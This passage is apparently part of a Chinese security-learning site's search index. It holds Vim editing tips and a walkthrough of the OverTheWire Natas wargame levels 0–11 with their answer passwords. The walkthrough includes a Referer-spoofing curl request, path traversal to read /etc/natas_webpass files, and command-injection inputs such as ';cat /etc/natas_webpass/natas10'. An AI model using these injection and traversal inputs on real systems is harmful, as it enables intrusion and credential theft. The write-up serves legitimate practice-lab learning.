alternate-file \u6765\u83b7\u53d6\u66f4\u591a\u5e2e\u52a9 Expression = \u7528\u6237 \u5426 \u590d\u5236 VimL \u4ee3\u7801\u65f6\uff0c\u8fd9\u4e2a\u5bc4\u5b58\u5668\u7528\u4e8e\u5b58\u50a8\u4ee3\u7801\u7247\u6bb5\u7684\u6267\u884c\u7ed3\u679c\u3002\u6bd4\u5982\uff0c\u5728\u63d2\u5165\u6a21\u5f0f\u4e0b\u590d\u5236 <c-r>=5+5<cr> \uff0c\u90a3\u4e48\u8fd9\u4e2a\u5bc4\u5b58\u5668\u5c31\u4f1a\u5b58\u5165 10 Selection + \u548c * vim \u5426 * \u548c + \u662f \u526a\u8d34\u677f \u5bc4\u5b58\u5668 Drop ~ vim \u662f \u6700\u540e\u4e00\u6b21\u62d6\u62fd\u6dfb\u52a0\u81f3 Vim \u7684\u6587\u672c\uff08\u9700\u8981 \"+dnd\" \u652f\u6301\uff0c\u6682\u65f6\u53ea\u652f\u6301 GTK GUI\u3002\u8bf7\u53c2\u9605 :help dnd \u53ca :help quote~ \uff09 Black hole _ vim \u5426 \u4e00\u822c\u79f0\u4e3a\u9ed1\u6d1e\u5bc4\u5b58\u5668\u3002\u5bf9\u4e8e\u5f53\u524d\u64cd\u4f5c\uff0c\u5982\u679c\u4f60\u4e0d\u5e0c\u671b\u5728\u5176\u4ed6\u5bc4\u5b58\u5668\u4e2d\u4fdd\u7559\u6587\u672c\uff0c\u90a3\u5c31\u5728\u547d\u4ee4\u524d\u52a0\u4e0a _ \u3002\u6bd4\u5982\uff0c \"_dd \u547d\u4ee4\u4e0d\u4f1a\u5c06\u6587\u672c\u653e\u5230\u5bc4\u5b58\u5668 \" \u3001 1 \u3001 + \u6216 * \u4e2d Last search pattern / vim \u5426 \u6700\u8fd1\u4e00\u6b21\u901a\u8fc7 / \u3001 ? \u6216 :global \u7b49\u547d\u4ee4\u8c03\u7528\u7684\u5339\u914d\u6761\u4ef6 \u5341\u5206\u6709\u7528\uff01\uff01\uff01 ## \u8303\u56f4 \u719f\u7ec3\u4f7f\u7528\u8303\u56f4\uff0c\u53ef\u4ee5\u64cd\u4f5c\u5f97\u5f88\u5feb \u6bd4\u5982\u9017\u53f7\u5206\u53f7\u8868\u793a\u7684\u8303\u56f4\u3002 \u8865\u5168 ctrl+x","title":"Vim\u5b9e\u7528\u6280\u5de7"},{"location":"Useful-tools/vim/#vim","text":"\u8fd9\u672c\u4e66\u5e94\u8be5\u53cd\u590d\u770b\u3001\u53cd\u590d\u770b\u3001\u53cd\u590d\u770b\uff01","title":"Vim\u5b9e\u7528\u6280\u5de7"},{"location":"Useful-tools/vim/#basic","text":"\u9996\u5148\u4f60\u9700\u8981\u4f1a\u4e00\u4e9b\u57fa\u7840\u6027\u7684\u64cd\u4f5c","title":"basic"},{"location":"Useful-tools/vim/#1","text":"\u4f7f\u7528 . \u547d\u4ee4\u6765\u91cd\u590d","title":"\u6280\u5de71"},{"location":"Useful-tools/vim/#2","text":"\u5f88\u591aVim\u7684\u5355\u952e\u547d\u4ee4\u90fd\u53ef\u4ee5\u88ab\u770b\u6210\u4e24\u4e2a\u6216\u591a\u4e2a\u5176\u4ed6\u547d\u4ee4\u7684\u7ec4\u5408","title":"\u6280\u5de72"},{"location":"Useful-tools/vim/#3","text":"f\u67e5\u627e\uff0cs\u5220\u9664\uff0c\u5206\u53f7\u4f1a\u7ee7\u7eed\u67e5\u627e","title":"\u6280\u5de73"},{"location":"Useful-tools/vim/#4","text":"\u76ee\u7684 \u64cd\u4f5c \u91cd\u590d \u56de\u9000 \u505a\u51fa\u4e00\u4e2a\u4fee\u6539 {edit} . u \u5728\u884c\u5185\u67e5\u627e\u4e0b\u4e00\u6307\u5b9a\u5b57\u7b26 f{char}/t{char} ; , \u5728\u884c\u5185\u67e5\u627e\u4e0a\u4e00\u6307\u5b9a\u5b57\u7b26 F{char}/T{char} ; , \u5728\u6587\u6863\u4e2d\u67e5\u627e\u4e0b\u4e00\u5904\u5339\u914d\u9879 /pattern n N \u5728\u6587\u6863\u4e2d\u67e5\u627e\u4e0a\u4e00\u5904\u5339\u914d\u9879 ?pattern n N \u6267\u884c\u66ff\u6362 :s/target/replacement & u \u6267\u884c\u4e00\u7cfb\u5217\u4fee\u6539 qx{changes}q @x u ## \u6280\u5de75 \u6309 * \u641c\u7d22\uff0cc\u662f\u4fee\u6539","title":"\u6280\u5de74"},{"location":"Useful-tools/vim/#vim_1","text":"\u7f51\u5740\u5728\u8fd9\u513f","title":"Vim \u4ece\u5165\u95e8\u5230\u7cbe\u901a"},{"location":"Useful-tools/vim/#vim_2","text":"\u51cf\u5c11\u8ba4\u8bc6\u8d1f\u8377\u5e76\u5e2e\u52a9\u4eba\u4eec\u4e13\u6ce8\u4e8e\u5b9e\u9645\u4efb\u52a1","title":"vim\u54f2\u5b66"},{"location":"Useful-tools/vim/#_1","text":"\u7f13\u51b2\u533a\u662f\u5de5\u4f5c\u7684\u5730\u65b9\uff0c\u7a97\u53e3\u662f\u7f13\u51b2\u533a\u7684\u89c6\u7a97\uff0c\u6807\u7b7e\u662f\u7a97\u53e3\u7684\u96c6\u5408\u3002","title":"\u7f13\u51b2\u533a\uff0c\u7a97\u53e3\uff0c\u6807\u7b7e"},{"location":"Useful-tools/vim/#_2","text":"\u7528\u7c7b\u4f3c vim file1 \u7684\u547d\u4ee4\u542f\u52a8 Vim \u3002\u8fd9\u4e2a\u6587\u4ef6\u7684\u5185\u5bb9\u5c06\u4f1a\u88ab\u52a0\u8f7d\u5230\u7f13\u51b2\u533a\u4e2d\uff0c\u4f60\u73b0\u5728\u6709\u4e00\u4e2a\u5df2\u8f7d\u5165\u7684\u7f13\u51b2\u533a\u3002\u5982\u679c\u4f60\u5728 Vim \u4e2d\u4fdd\u5b58\u8fd9\u4e2a\u6587\u4ef6\uff0c\u7f13\u51b2\u533a\u5185\u5bb9\u5c06\u4f1a\u88ab\u540c\u6b65\u5230\u78c1\u76d8\u4e0a\uff08\u5199\u56de\u6587\u4ef6\u4e2d\uff09\u3002 \u7531\u4e8e\u8fd9\u4e2a\u7f13\u51b2\u533a\u4e5f\u5728\u4e00\u4e2a\u7a97\u53e3\u4e0a\u663e\u793a\uff0c\u6240\u4ee5\u4ed6\u4e5f\u662f\u4e00\u4e2a\u5df2\u6fc0\u6d3b\u7684\u7f13\u51b2\u533a\u3002\u5982\u679c\u4f60\u73b0\u5728\u901a\u8fc7 :e file2 \u547d\u4ee4\u52a0\u8f7d\u53e6\u4e00\u4e2a\u6587\u4ef6\uff0cfile1 \u5c06\u4f1a\u53d8\u6210\u4e00\u4e2a\u9690\u85cf\u7684\u7f13\u51b2\u533a\uff0c\u5e76\u4e14 file2 \u53d8\u6210\u5df2\u6fc0\u6d3b\u7f13\u51b2\u533a\u3002 \u4f7f\u7528 :ls \u6211\u4eec\u80fd\u591f\u5217\u51fa\u6240\u6709\u53ef\u4ee5\u5217\u51fa\u7684\u7f13\u51b2\u533a\u3002\u63d2\u4ef6\u7f13\u51b2\u533a\u548c\u5e2e\u52a9\u7f13\u51b2\u533a\u901a\u5e38\u88ab\u6807\u8bb0\u4e3a\u4e0d\u53ef\u4ee5\u5217\u51fa\u7684\u7f13\u51b2\u533a\uff0c\u56e0\u4e3a\u90a3\u5e76\u4e0d\u662f\u4f60\u7ecf\u5e38\u9700\u8981\u5728\u7f16\u8f91\u5668\u4e2d\u7f16\u8f91\u7684\u5e38\u89c4\u6587\u4ef6\u3002\u901a\u8fc7 :ls! \u547d\u4ee4\u53ef\u4ee5\u663e\u793a\u88ab\u653e\u5165\u7f13\u51b2\u533a\u5217\u8868\u7684\u548c\u672a\u88ab\u653e\u5165\u5217\u8868\u7684\u7f13\u51b2\u533a\u3002 \u672a\u547d\u540d\u7684\u7f13\u51b2\u533a\u662f\u4e00\u79cd\u6ca1\u6709\u5173\u8054\u7279\u5b9a\u6587\u4ef6\u7684\u7f13\u51b2\u533a\uff0c\u8fd9\u79cd\u7f13\u51b2\u533a\u7ecf\u5e38\u88ab\u63d2\u4ef6\u4f7f\u7528\u3002\u6bd4\u5982 :enew \u5c06\u4f1a\u521b\u5efa\u4e00\u4e2a\u65e0\u540d\u4e34\u65f6\u7f13\u51b2\u533a\u3002\u6dfb\u52a0\u4e00\u4e9b\u6587\u672c\u7136\u540e\u4f7f\u7528 :w /tmp/foo \u5c06\u4ed6\u5199\u5165\u5230\u78c1\u76d8\uff0c\u8fd9\u6837\u8fd9\u4e2a\u7f13\u51b2\u533a\u5c31\u4f1a\u53d8\u6210\u4e00\u4e2a\u5df2\u547d\u540d\u7684\u7f13\u51b2\u533a\u3002","title":"\u5df2\u6fc0\u6d3b\u3001\u5df2\u8f7d\u5165\u3001\u5df2\u5217\u51fa\u3001\u5df2\u547d\u540d\u7684\u7f13\u51b2\u533a"},{"location":"Useful-tools/vim/#_3","text":"\u7c7b\u578b \u6807\u8bc6 \u8bfb\u5199\u8005 \u662f\u5426\u4e3a\u53ea\u8bfb \u5305\u542b\u7684\u5b57\u7b26\u6765\u6e90 Unnamed \" vim \u5426 \u6700\u8fd1\u4e00\u6b21\u7684\u590d\u5236\u6216\u5220\u9664\u64cd\u4f5c ( d , c , s , x , y ) Numbered 0 \u81f3 9 vim \u5426 \u5bc4\u5b58\u5668 0 : \u6700\u8fd1\u4e00\u6b21\u590d\u5236\u3002\u5bc4\u5b58\u5668 1 : \u6700\u8fd1\u4e00\u6b21\u5220\u9664\u3002\u5bc4\u5b58\u5668 2 : \u5012\u6570\u7b2c\u4e8c\u6b21\u5220\u9664\uff0c\u4ee5\u6b64\u7c7b\u63a8\u3002\u5bf9\u4e8e\u5bc4\u5b58\u5668 1 \u81f3 9 \uff0c\u4ed6\u4eec\u5176\u5b9e\u662f\u53ea\u8bfb\u7684\u6700\u591a\u5305\u542b 9 \u4e2a\u5143\u7d20\u7684\u961f\u5217\u3002\u8fd9\u91cc\u7684\u961f\u5217\u5373\u4e3a\u6570\u636e\u7c7b\u578b queue Small delete - vim \u5426 \u6700\u8fd1\u4e00\u6b21\u884c\u5185\u5220\u9664 Named a \u81f3 z , A \u81f3 Z \u7528\u6237 \u5426 \u5982\u679c\u4f60\u901a\u8fc7\u590d\u5236\u64cd\u4f5c\u5b58\u50a8\u6587\u672c\u81f3\u5bc4\u5b58\u5668 a \uff0c\u90a3\u4e48 a \u4e2d\u7684\u6587\u672c\u5c31\u4f1a\u88ab\u5b8c\u5168\u8986\u76d6\u3002\u5982\u679c\u4f60\u5b58\u50a8\u81f3 A \uff0c\u90a3\u4e48\u4f1a\u5c06\u6587\u672c\u6dfb\u52a0\u7ed9\u5bc4\u5b58\u5668 a \uff0c\u4e0d\u4f1a\u8986\u76d6\u4e4b\u524d\u5df2\u6709\u7684\u6587\u672c Read-only : \u4e0e . \u548c % vim \u662f : : \u6700\u8fd1\u4e00\u6b21\u4f7f\u7528\u7684\u547d\u4ee4\uff0c . : \u6700\u8fd1\u4e00\u6b21\u6dfb\u52a0\u7684\u6587\u672c\uff0c % : \u5f53\u524d\u7684\u6587\u4ef6\u540d Alternate buffer # vim \u5426 \u5927\u90e8\u5206\u60c5\u51b5\u4e0b\uff0c\u8fd9\u4e2a\u5bc4\u5b58\u5668\u662f\u5f53\u524d\u7a97\u53e3\u4e2d\uff0c\u4e0a\u4e00\u6b21\u8bbf\u95ee\u7684\u7f13\u51b2\u533a\u3002\u8bf7\u53c2\u9605 :h alternate-file \u6765\u83b7\u53d6\u66f4\u591a\u5e2e\u52a9 Expression = \u7528\u6237 \u5426 \u590d\u5236 VimL \u4ee3\u7801\u65f6\uff0c\u8fd9\u4e2a\u5bc4\u5b58\u5668\u7528\u4e8e\u5b58\u50a8\u4ee3\u7801\u7247\u6bb5\u7684\u6267\u884c\u7ed3\u679c\u3002\u6bd4\u5982\uff0c\u5728\u63d2\u5165\u6a21\u5f0f\u4e0b\u590d\u5236 <c-r>=5+5<cr> \uff0c\u90a3\u4e48\u8fd9\u4e2a\u5bc4\u5b58\u5668\u5c31\u4f1a\u5b58\u5165 10 Selection + \u548c * vim \u5426 * \u548c + \u662f \u526a\u8d34\u677f \u5bc4\u5b58\u5668 Drop ~ vim \u662f \u6700\u540e\u4e00\u6b21\u62d6\u62fd\u6dfb\u52a0\u81f3 Vim \u7684\u6587\u672c\uff08\u9700\u8981 \"+dnd\" \u652f\u6301\uff0c\u6682\u65f6\u53ea\u652f\u6301 GTK GUI\u3002\u8bf7\u53c2\u9605 :help dnd \u53ca :help quote~ \uff09 Black hole _ vim \u5426 \u4e00\u822c\u79f0\u4e3a\u9ed1\u6d1e\u5bc4\u5b58\u5668\u3002\u5bf9\u4e8e\u5f53\u524d\u64cd\u4f5c\uff0c\u5982\u679c\u4f60\u4e0d\u5e0c\u671b\u5728\u5176\u4ed6\u5bc4\u5b58\u5668\u4e2d\u4fdd\u7559\u6587\u672c\uff0c\u90a3\u5c31\u5728\u547d\u4ee4\u524d\u52a0\u4e0a _ \u3002\u6bd4\u5982\uff0c \"_dd \u547d\u4ee4\u4e0d\u4f1a\u5c06\u6587\u672c\u653e\u5230\u5bc4\u5b58\u5668 \" \u3001 1 \u3001 + \u6216 * \u4e2d Last search pattern / vim \u5426 \u6700\u8fd1\u4e00\u6b21\u901a\u8fc7 / \u3001 ? \u6216 :global \u7b49\u547d\u4ee4\u8c03\u7528\u7684\u5339\u914d\u6761\u4ef6 \u5341\u5206\u6709\u7528\uff01\uff01\uff01 ## \u8303\u56f4 \u719f\u7ec3\u4f7f\u7528\u8303\u56f4\uff0c\u53ef\u4ee5\u64cd\u4f5c\u5f97\u5f88\u5feb \u6bd4\u5982\u9017\u53f7\u5206\u53f7\u8868\u793a\u7684\u8303\u56f4\u3002","title":"\u5bc4\u5b58\u5668"},{"location":"Useful-tools/vim/#_4","text":"ctrl+x","title":"\u8865\u5168"},{"location":"WarGame/","text":"WarGame \u4e00\u4e2a\u5341\u5206\u4f18\u79c0\u7684\u514d\u8d39\u9776\u573a\uff0c\u975e\u5e38\u9002\u5408\u65b0\u624b\u5165\u95e8\u6216\u8005\u9ad8\u624b\u4f11\u95f2\u5a31\u4e50\u3002","title":"WarGame"},{"location":"WarGame/#wargame","text":"\u4e00\u4e2a\u5341\u5206\u4f18\u79c0\u7684\u514d\u8d39\u9776\u573a\uff0c\u975e\u5e38\u9002\u5408\u65b0\u624b\u5165\u95e8\u6216\u8005\u9ad8\u624b\u4f11\u95f2\u5a31\u4e50\u3002","title":"WarGame"},{"location":"WarGame/Natas/","text":"level0 \u76f4\u63a5\u767b\u5f55\uff0c\u7136\u540e\u67e5\u770b\u7f51\u9875\u6e90\u4ee3\u7801 <html> <head> <!-- This stuff in the header has nothing to do with the level --> <link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\"> <link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" /> <link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" /> <script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script> <script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script> <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script> <script>var wechallinfo = { \"level\": \"natas0\", \"pass\": \"natas0\" };</script></head> <body> <h1>natas0</h1> <div id=\"content\"> You can find the password for the next level on this page. <!--The password for natas1 is g9D9cREhslqBKtcA2uocGHPfMZVzeFK6 --> </div> </body> </html> level1 \u4e0d\u8ba9\u53f3\u952e\u4e86 \u90a3\u5c31\u6309F12\u554a <!--The password for natas2 is h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7 --> level2 \u8bf4\u5565\u4e5f\u6ca1\u6709 \u8fd8\u662f\u770b\u6e90\u7801 <html> <head> <!-- This stuff in the header has nothing to do with the level --> <link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\"> <link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" /> <link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" /> <script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script> <script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script> <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script> <script>var wechallinfo = { \"level\": \"natas2\", \"pass\": \"h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7\" };</script></head> <body> <h1>natas2</h1> <div id=\"content\"> There is nothing on this page <img src=\"files/pixel.png\"> </div> </body></html> \u6709\u4e2a\u56fe\u7247\uff0c\u70b9\u8fdb\u53bb\u770b\uff0c\u8fdb\u7236\u76ee\u5f55 http://natas2.natas.labs.overthewire.org/files/ \u5f97\u5230\u5bc6\u7801 # username:password alice:BYNdCesZqW bob:jw2ueICLvT charlie:G5vCxkVV3m natas3:G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q eve:zo4mJWyNj2 mallory:9urtcpzBmH level3 \u6e90\u4ee3\u7801\u5565\u4e5f\u6ca1\u6709\uff0c\u5f88G <html> <head> <!-- This stuff in the header has nothing to do with the level --> <link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\"> <link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" /> <link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" /> <script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script> <script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script> <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script> <script>var wechallinfo = { \"level\": \"natas3\", \"pass\": \"G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q\" };</script></head> <body> <h1>natas3</h1> <div id=\"content\"> There is nothing on this page <!-- No more information leaks!! Not even Google will find it this time... --> </div> </body></html> \u8c37\u6b4c\u641c\u4e0d\u5230\uff1f\u6211\u5fc5\u5e94\u6765\u641c\uff01 \u8fdb\u53bb\u662f\u4e00\u4e2a\u548clevel2\u4e00\u6837\u7684\u754c\u9762\uff0c\u89e3\u51b3\u4e86\u3002\u3002\u3002 natas4:tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm \u8fd9\u4e2a\u9898\u9700\u8981\u77e5\u9053 site: \u8fd9\u4e2a\u9ad8\u7ea7\u641c\u7d22\u7528\u6cd5 level4 <html> <head> <!-- This stuff in the header has nothing to do with the level --> <link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\"> <link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" /> <link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" /> <script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script> <script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script> <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script> <script>var wechallinfo = { \"level\": \"natas4\", \"pass\": \"tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm\" };</script></head> <body> <h1>natas4</h1> <div id=\"content\"> Access disallowed. You are visiting from \"\" while authorized users should come only from \"http://natas5.natas.labs.overthewire.org/\" <br/> <div id=\"viewsource\"><a href=\"index.php\">Refresh page</a></div> </div> </body> </html> \u7136\u540e\u4e00\u6761\u547d\u4ee4\u89e3\u51b3 C:\\Users\\>curl -e \"http://natas5.natas.labs.overthewire.org/\" -u natas4:tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm \"http://natas4.natas.labs.overthewire.org/\" <html> <head> <!-- This stuff in the header has nothing to do with the level --> <link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\"> <link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" /> <link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" /> <script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script> <script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script> <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script> <script>var wechallinfo = { \"level\": \"natas4\", \"pass\": \"tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm\" };</script></head> <body> <h1>natas4</h1> <div id=\"content\"> Access granted. The password for natas5 is Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD <br/> <div id=\"viewsource\"><a href=\"index.php\">Refresh page</a></div> </div> </body> </html> C:\\Users\\> \u53e6\u4e00\u79cd\u65b9\u6cd5\u5219\u662f\u4f7f\u7528burpsuite,\u81ea\u5df1\u53d1\u5305 level5 \u53d1\u73b0\u9700\u8981cookie \u90a3\u4e48\u968f\u4fbf\u6539\u6539\u4e5f\u5c31\u89e3\u51b3\u4e86 Access granted. The password for natas6 is fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR level6 \u8fdb\u6765\u53ef\u4ee5\u770b\u6e90\u4ee3\u7801 <html> <head> <!-- This stuff in the header has nothing to do with the level --> <link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\"> <link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" /> <link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" /> <script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script> <script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script> <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script> <script>var wechallinfo = { \"level\": \"natas6\", \"pass\": \"<censored>\" };</script></head> <body> <h1>natas6</h1> <div id=\"content\"> <? include \"includes/secret.inc\"; if(array_key_exists(\"submit\", $_POST)) { if($secret == $_POST['secret']) { print \"Access granted. The password for natas7 is <censored>\"; } else { print \"Wrong secret\"; } } ?> <form method=post> Input secret: <input name=secret><br> <input type=submit name=submit> </form> <div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div> </div> </body> </html> \u8fd9\u91cc\u4e0e\u5bc6\u94a5\u6709\u4e00\u4e2a\u662f\u5426\u76f8\u540c\u7684\u5224\u65ad\uff0c\u90a3\u4e48\u76f4\u63a5\u8bbf\u95ee\u90a3\u4e2a\u7f51\u5740 includes/secret.inc \uff0c\u5f97\u5230\u5bc6\u94a5 <? $secret = \"FOEIUWGHFEEUHOFUOIU\"; ?> \u7136\u540e\u8f93\u5165\uff0c\u5f97\u5230\u5bc6\u7801 Access granted. The password for natas7 is jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr level7 \u767b\u5f55\u540e\u6e90\u7801 <html> <head> <!-- This stuff in the header has nothing to do with the level --> <link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\"> <link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" /> <link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" /> <script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script> <script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script> <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script> <script>var wechallinfo = { \"level\": \"natas7\", \"pass\": \"jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr\" };</script></head> <body> <h1>natas7</h1> <div id=\"content\"> <a href=\"index.php?page=home\">Home</a> <a href=\"index.php?page=about\">About</a> <br> <br> <!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 --> </div> </body> </html> \u8fd9\u4e2a\u63d0\u793a\uff0c\u5f88\u6709\u8fd9\u4e2a\u7f51\u7ad9\u7684\u98ce\u683c\u3002\u3002\u3002 # \u8bbf\u95ee\u7f51\u5740http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8 # \u5bc6\u94a5 a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB level8 \u6838\u5fc3\u5728\u4e0b\u8fb9\u513f <? $encodedSecret = \"3d3d516343746d4d6d6c315669563362\"; function encodeSecret($secret) { return bin2hex(strrev(base64_encode($secret))); } if(array_key_exists(\"submit\", $_POST)) { if(encodeSecret($_POST['secret']) == $encodedSecret) { print \"Access granted. The password for natas9 is <censored>\"; } else { print \"Wrong secret\"; } } ?> strrev\u51fd\u6570\u7684 \u8bf4\u660e \uff0c\u5c31\u662f\u53cd\u8f6c\u5b57\u7b26\u4e32\u3002 \u56e0\u6b64\uff0c\u5efa\u8bae\u627e\u4e00\u4e9b\u5728\u7ebf\u5c0f\u5de5\u5177\u505a\u4e0b\u9762\u7684\u64cd\u4f5c <?php echo base64_decode(strrev(hex2bin(\"3d3d516343746d4d6d6c315669563362\"))); ?> \u8f93\u51fa\u7ed3\u679c\u540e\uff0c\u5f97\u5230\u5bc6\u94a5 Access granted. The password for natas9 is Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd level9 <? $key = \"\"; if(array_key_exists(\"needle\", $_REQUEST)) { $key = $_REQUEST[\"needle\"]; } if($key != \"\") { passthru(\"grep -i $key dictionary.txt\"); } ?> \u76f4\u63a5\u547d\u4ee4\u6ce8\u5165 \u8f93\u5165;cat /etc/natas_webpass/natas10 \u5f97\u5230\u5bc6\u94a5 D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE level10 \u4ed6\u4eec\u5b66\u806a\u660e\u4e86 <? $key = \"\"; if(array_key_exists(\"needle\", $_REQUEST)) { $key = $_REQUEST[\"needle\"]; } if($key != \"\") { if(preg_match('/[;|&]/',$key)) { print \"Input contains an illegal character!\"; } else { passthru(\"grep -i $key dictionary.txt\"); } } ?> \u5c31\u662f\u5199\u6b63\u5219\uff0c\u6c34\u7684 [a-zA-Z] /etc/natas_webpass/natas11 # [[:alpha:]] /etc/natas_webpass/natas11 # 1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg level11 \u4ee3\u7801\u5ba1\u8ba1\u5de5\u4f5c\u5982\u4e0b\uff1a <? $defaultdata = array( \"showpassword\"=>\"no\", \"bgcolor\"=>\"#ffffff\"); function xor_encrypt($in) { $key = '<censored>'; $text = $in; $outText = ''; // Iterate through each character for($i=0;$i<strlen($text);$i++) { $outText .= $text[$i] ^ $key[$i % strlen($key)]; } return $outText; } function loadData($def) { global $_COOKIE; $mydata = $def; if(array_key_exists(\"data\", $_COOKIE)) { $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE[\"data\"])), true); if(is_array($tempdata) && array_key_exists(\"showpassword\", $tempdata) && array_key_exists(\"bgcolor\", $tempdata)) { if (preg_match('/^#(?:[a-f\\d]{6})$/i', $tempdata['bgcolor'])) { $mydata['showpassword'] = $tempdata['showpassword']; $mydata['bgcolor'] = $tempdata['bgcolor']; } } } return $mydata; } function saveData($d) { setcookie(\"data\", base64_encode(xor_encrypt(json_encode($d)))); } $data = loadData($defaultdata); if(array_key_exists(\"bgcolor\",$_REQUEST)) { if (preg_match('/^#(?:[a-f\\d]{6})$/i', $_REQUEST['bgcolor'])) { $data['bgcolor'] = $_REQUEST['bgcolor']; } } saveData($data); ?> level12 level13 level14 level15 level16 level17 level18 level19 level20 level21 level21 level23 level24 level25 level26 level27 level28 level29 level30 level31 level32 level33","title":"natas"},{"location":"WarGame/Natas/#level0","text":"\u76f4\u63a5\u767b\u5f55\uff0c\u7136\u540e\u67e5\u770b\u7f51\u9875\u6e90\u4ee3\u7801 <html> <head> <!-- This stuff in the header has nothing to do with the level --> <link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\"> <link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" /> <link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" /> <script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script> <script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script> <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script> <script>var wechallinfo = { \"level\": \"natas0\", \"pass\": \"natas0\" };</script></head> <body> <h1>natas0</h1> <div id=\"content\"> You can find the password for the next level on this page. <!--The password for natas1 is g9D9cREhslqBKtcA2uocGHPfMZVzeFK6 --> </div> </body> </html>","title":"level0"},{"location":"WarGame/Natas/#level1","text":"\u4e0d\u8ba9\u53f3\u952e\u4e86 \u90a3\u5c31\u6309F12\u554a <!--The password for natas2 is h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7 -->","title":"level1"},{"location":"WarGame/Natas/#level2","text":"\u8bf4\u5565\u4e5f\u6ca1\u6709 \u8fd8\u662f\u770b\u6e90\u7801 <html> <head> <!-- This stuff in the header has nothing to do with the level --> <link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\"> <link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" /> <link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" /> <script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script> <script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script> <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script 